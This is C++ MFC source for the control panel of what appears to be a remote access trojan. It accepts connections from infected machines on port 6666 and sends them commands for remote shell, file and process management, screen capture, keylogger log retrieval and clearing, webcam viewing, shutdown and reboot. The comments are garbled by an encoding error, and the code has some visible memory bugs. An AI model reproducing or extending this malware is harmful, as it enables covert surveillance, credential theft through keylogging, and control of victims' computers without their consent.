
// socket apcetDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "socket apcet.h"
#include "socket apcetDlg.h"
#include "afxdialogex.h"
#include "Clistensocket.h"
#include "Cmd.h"
#include"CServer.h"
#include "SCREEN.h"
#include "Process.h"
#include "Filemange.h"
#include"Creg.h"
#include"Ifo.h"
#include"Vdio.h"
#include <stdio.h>
#include <iostream>
#include <cstring>
#include <fstream>
using namespace std;
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
CTreeCtrl *ptree;
HTREEITEM htree=NULL;
CString ConstCharToCStringIp(const char* ch)
{
	char* buf = new char[strlen(ch) + 1];
	memset(buf, 0, sizeof(ch));
	strcpy(buf, ch);
	CString  strName;
	strName = buf;
	delete[]buf;
	return strName;
}
// CsocketapcetDlg �Ի���



CsocketapcetDlg::CsocketapcetDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CsocketapcetDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_pListensocket = NULL;
}

void CsocketapcetDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE1, m_tree);
}

BEGIN_MESSAGE_MAP(CsocketapcetDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_NOTIFY(NM_DBLCLK, IDC_TREE1, &CsocketapcetDlg::OnDblclkTree1)
	ON_COMMAND(ID_32771, &CsocketapcetDlg::File)
	ON_COMMAND(ID_32772, &CsocketapcetDlg::screnn)
	ON_COMMAND(ID_32773, &CsocketapcetDlg::cmd)
	ON_COMMAND(ID_32774, &CsocketapcetDlg::keyboard)
	ON_COMMAND(ID_32775, &CsocketapcetDlg::shutdown)
	ON_COMMAND(ID_32776, &CsocketapcetDlg::reboot)
	ON_COMMAND(ID_32777, &CsocketapcetDlg::exit)
	ON_COMMAND(ID_32778, &CsocketapcetDlg::mess)
	ON_COMMAND(ID_32779, &CsocketapcetDlg::clean)
	ON_COMMAND(ID_32780, &CsocketapcetDlg::process)
	ON_COMMAND(ID_32782, &CsocketapcetDlg::reg)
	ON_COMMAND(ID_32783, &CsocketapcetDlg::server)
	ON_COMMAND(ID_32799, &CsocketapcetDlg::Getifo)
	ON_COMMAND(ID_32800, &CsocketapcetDlg::GetVdio)
END_MESSAGE_MAP()


// CsocketapcetDlg ��Ϣ�������

BOOL CsocketapcetDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO:  �ڴ���Ӷ���ĳ�ʼ������
	m_tree.InsertItem(_T("���е���"));
	m_pListensocket = new CListenSocket(this);
	
	//socket
	if (m_pListensocket->Create(6666, SOCK_STREAM)==FALSE)
	{
		MessageBoxA(0, "��ʼ��ʧ��", "tip", 0);
		delete m_pListensocket;
		m_pListensocket = NULL;
		EndDialog(IDOK);
	}

	if (FALSE == m_pListensocket->Listen())
	{
		MessageBoxA(0, "��ʼ��ʧ��", "tip", 0);
		delete m_pListensocket;
		m_pListensocket = NULL;
		EndDialog(IDOK);
	}
	
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CsocketapcetDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CsocketapcetDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CsocketapcetDlg::OnAccept()
{
	HTREEITEM hnewItem;
	CClistensocket *pSocket = new CClistensocket;
	m_pListensocket->Accept(*pSocket);
	//��ȡ��Ϣ
	char ip[16] = "";
	pSocket->Receive(ip, 16);
	//��Ӧ tree
	HTREEITEM hRootItem = m_tree.GetRootItem();
	hnewItem = m_tree.InsertItem(ConstCharToCStringIp(ip), hRootItem);
	
	m_tree.SetItemData(hnewItem, (DWORD)pSocket);
	
	//MessageBoxA(0, "�����Ӳ���", "tip", 0);
}

void CsocketapcetDlg::OnDblclkTree1(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	ptree = (CTreeCtrl*)GetDlgItem(IDC_TREE1);
	htree= m_tree.GetSelectedItem();
	if (htree == m_tree.GetRootItem())
		return;
	POINT p;
	GetCursorPos(&p);
	CMenu menu;
	menu.LoadMenu(IDR_MENU1);
	CMenu * pMenu;
	pMenu = menu.GetSubMenu(0);
	pMenu->EnableMenuItem(ID_32771, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32772, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32773, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32774, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32775, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32776, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32777, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32778, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32779, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32780, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32783, MF_BYCOMMAND | MF_ENABLED);
	pMenu->EnableMenuItem(ID_32782, MF_BYCOMMAND | MF_ENABLED);
	pMenu->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON, p.x, p.y, this);
	pMenu->Detach();
	menu.DestroyMenu();
	//CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	*pResult = 0;
}

void CsocketapcetDlg::File()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname,_T("(���ڹ�����)"))!=NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CFilemange *pDlg = new CFilemange(pSocket, htree, tname);
	pDlg->Create(IDD_FILE);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(���ڹ�����)");
	m_tree.SetItemText(htree, tname);
	return;
}
void CsocketapcetDlg::server()
{
	MessageBoxA(0, "��Ǯ������", "tip", 0);
	return;
	if (htree == NULL)
	{
		return;
	}
	CClistensocket* pSocket = (CClistensocket*)m_tree.GetItemData(htree);
	CServer* pDlg = new CServer(pSocket);
	pDlg->Create(IDD_SERVER);
	pDlg->ShowWindow(SW_SHOW);
	return;
}
void CsocketapcetDlg::reg()
{
	MessageBoxA(0, "��Ǯ������", "tip", 0);
	return;
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	Creg *pDlg = new Creg(pSocket);
	pDlg->Create(IDD_REG);
	pDlg->ShowWindow(SW_SHOW);
	return;
}
void CsocketapcetDlg::screnn()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CSCREEN *pDlg = new CSCREEN(pSocket, htree, tname);
	pDlg->Create(IDD_SCREEN);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(���ڹ�����)");
	m_tree.SetItemText(htree, tname);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::cmd()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CCmd *pDlg = new CCmd(pSocket, htree, tname);
	pDlg->Create(IDD_CMD);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(���ڹ�����)");
	m_tree.SetItemText(htree, tname);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::keyboard()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("keyboard", 10);
	char ckeck[10] = "";
	pSocket->Receive(ckeck, 10);
	if (strcmp(ckeck,"wrong")==0)
	{
		MessageBoxA(0, "��ȡʧ��", "tip", 0);
		return;
	}
	pSocket->Send("keyboard", 10);
	//////////////////recv/////////////////////////
	const int bufferSize = 1024;
	char buffer[bufferSize] = { 0 };
	int readLen = 0;
	ofstream desFile;
	desFile.open("ketrecode.txt", ios::binary);
	do
	{
		readLen = pSocket->Receive(buffer, bufferSize);
		//MessageBoxA(0, buffer, "1", 0);
		if (strcmp("finish", buffer) == 0)
		{
			//m_pSocket->Send("imokeee", 10);
			break;
		}
		pSocket->Send("imokeee", 10);
		desFile.write(buffer, readLen);
	} while (true);
	desFile.close();
	MessageBoxA(0, "�ѷŵ���ǰĿ¼�µ�key.txt", "tip", 0);
	return;
}
void CsocketapcetDlg::shutdown()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("shutdown", 9);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::reboot()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("reboot", 7);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::exit()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree==NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("exit", 5);
	m_tree.DeleteItem(htree);
	delete[] pSocket;
	return;
}
void CsocketapcetDlg::mess()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	Ctip *pDlg = new Ctip(pSocket, htree, tname);
	pDlg->Create(IDD_TIP);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(���ڹ�����)");
	m_tree.SetItemText(htree, tname);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::clean()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	pSocket->Send("clearkeyboard", 15);
	char recd[25] = "";
	pSocket->Receive(recd, 25);
	MessageBoxA(0, recd, "tip", 0);
	//delete pSocket;
	return;
}
void CsocketapcetDlg::process()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CProcess *pDlg = new CProcess(pSocket, htree, tname);
	pDlg->Create(IDD_PROCESS);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(���ڹ�����)");
	m_tree.SetItemText(htree, tname);
	return;
}
void CsocketapcetDlg::Getifo()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	
	CIfo *pDlg = new CIfo(pSocket, htree, tname);
	pDlg->Create(IDD_IFO);
	pDlg->ShowWindow(SW_SHOW);
	tname = tname + _T("(���ڹ�����)");
	m_tree.SetItemText(htree, tname);
	return;
}
void CsocketapcetDlg::GetVdio()
{
	CString tname = m_tree.GetItemText(htree);
	if (_tcsstr(tname, _T("(���ڹ�����)")) != NULL)
	{
		MessageBoxA(0, "���Ƚ�����ǰ����", "Tip", 0);
		return;
	}
	if (htree == NULL)
	{
		return;
	}
	CClistensocket *pSocket = (CClistensocket *)m_tree.GetItemData(htree);
	pSocket->Send("checkvdio",12);
	char yesorno[5] = "";
	pSocket->Receive(yesorno, 5);
	if (strcmp(yesorno,"yes")==0)
	{
		CVdio *pDlg = new CVdio(pSocket, htree, tname);
		pDlg->Create(IDD_VIOD);
		pDlg->ShowWindow(SW_SHOW);
		tname = tname + _T("(���ڹ�����)");
		m_tree.SetItemText(htree, tname);
	}
	else
	{
		MessageBoxA(0, "�Է�û������ͷ", "Tip", 0);
	}
}